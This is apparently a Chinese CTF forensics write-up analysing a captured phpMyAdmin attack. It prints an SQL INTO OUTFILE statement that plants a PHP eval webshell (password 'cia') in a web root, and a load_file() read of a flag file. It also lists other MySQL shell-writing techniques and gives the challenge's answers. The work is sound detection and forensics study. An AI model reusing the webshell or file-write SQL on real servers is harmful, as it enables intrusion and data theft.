# case11：phpMyAdmin 写 Webshell + load_file 读文件（Bravo-1.pcapng）

**类型**：数据库权限滥用链（INTO OUTFILE 写 webshell / load_file 读任意文件）
**样本**：Bravo-1.pcapng（2018-11-30 时段）

---

## 攻击链（HTTP 流量中逐条可见）

```
① 进入 phpMyAdmin（phpstudy 环境，站点根 c:/phpstudy/www/）
② SQL 写 Webshell：
   select '<?php @eval($_POST[cia]);?>' into outfile 'c:/phpstudy/www/m/shell2.php';
   → 落地 shell2.php（一句话木马，密码 cia）
③ 读取系统文件：
   select load_file("c:/flag.txt")
   → 返回 BLOB 3 字节
```

## 关键提取物

| 项 | 值 |
|----|-----|
| Webshell 路径 | `c:/phpstudy/www/m/shell2.php` |
| Webshell 内容 | `<?php @eval($_POST[cia]);?>`（**密码 `cia`**） |
| flag.txt 内容 | **3 字节 = `0x44435a` = `DCZ`**（phpMyAdmin 行定位参数 `CAST(0x44435a AS BINARY)` 泄露） |

## 分析要点（phpMyAdmin 流量速读）

1. **语句全在 URL/表单里明文**：`sql_query=select+load_file(...)`（URL 编码），
   `unquote_plus` 后直接读；`value="...sql_query..."` 在响应 HTML 里也有一份。
2. **结果值不在正文也不怕**：BLOB 行显示为 `[BLOB - 3 B]` 链接，但链接的
   `where_clause=...CAST(0x44435a AS BINARY)` 用**十六进制**标出了该行值
   ——`bytes.fromhex('44435a')` = `DCZ`。**phpMyAdmin 的行编辑链接常是读取二进制
   结果的捷径**（正文只显示 [BLOB] 时）。
3. **`EXPLAIN` 变体**：攻击者常先 EXPLAIN 再执行——两种写法都出现，
   统计"执行过的语句"时注意去重（带/不带分号、URL 编码差异）。
4. INTO OUTFILE 三要素（可作检测规则）：`select` + `into outfile` + 站点路径
   （本题 `c:/phpstudy/www/`）；落地文件名 `shell2.php`（"2"暗示已有 shell1）。

## 同类变体判断指引

- phpMyAdmin/SQL 报错回显流量 = 找 `sql_query=`，全部语句唾手可得
- 问"写入的 webshell 路径/密码" → INTO OUTFILE 语句直接回答
- 问"读取到的 flag 内容" → 若结果区只见 [BLOB]，查行编辑链接的 `CAST(0x..)`；
  或查页面其它十六进制/转义形式
- MySQL 读文件替代手法：`load_file()`（读）、`into dumpfile`（写单行）、
  日志写马（`set global general_log_file`）——检测点各不同
